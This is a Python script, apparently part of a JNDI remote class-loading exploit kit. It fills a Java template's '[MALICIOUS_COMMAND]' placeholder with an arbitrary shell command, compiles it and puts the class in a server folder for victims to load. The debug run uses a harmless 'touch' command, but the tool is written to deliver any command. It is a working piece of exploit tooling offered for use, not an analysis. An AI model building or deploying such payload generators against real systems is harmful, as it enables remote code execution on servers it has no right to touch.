import os
import json
import subprocess
import shutil

TEMPLATE_PATH = f"./template/sample.java"


def generateClass(command, class_name="sample"):
    TEMPLATE_OUT = f"./tmp/{class_name}.java"
    CLASS_OUT = f"./tmp/{class_name}.class"
    SERVER_OUT = f"./root/{class_name}.class"

    cmds = command.split(" ")
    cmds = json.dumps(cmds)[1:-1]

    # read sample.java
    script = open(TEMPLATE_PATH, 'r')
    content = script.read()
    script.close()

    # replace malicious code
    content = content.replace("[MALICIOUS_COMMAND]", cmds)
    content = content.replace("[CLASS_NAME]", class_name)

    # save in tmp folder
    with open(TEMPLATE_OUT, 'w+') as fd:
        fd.write(content)

    # compile java file
    subprocess.Popen(f'javac {TEMPLATE_OUT}', shell=True).wait()

    # move class to server
    shutil.move(os.path.join(os.getcwd(), CLASS_OUT), os.path.join(os.getcwd(), SERVER_OUT))

    # delete script on tmp
    os.remove(TEMPLATE_OUT)

#debug main
if __name__ == "__main__":
    cmd = "touch /tmp/hihi222333"
    generateClass(cmd, )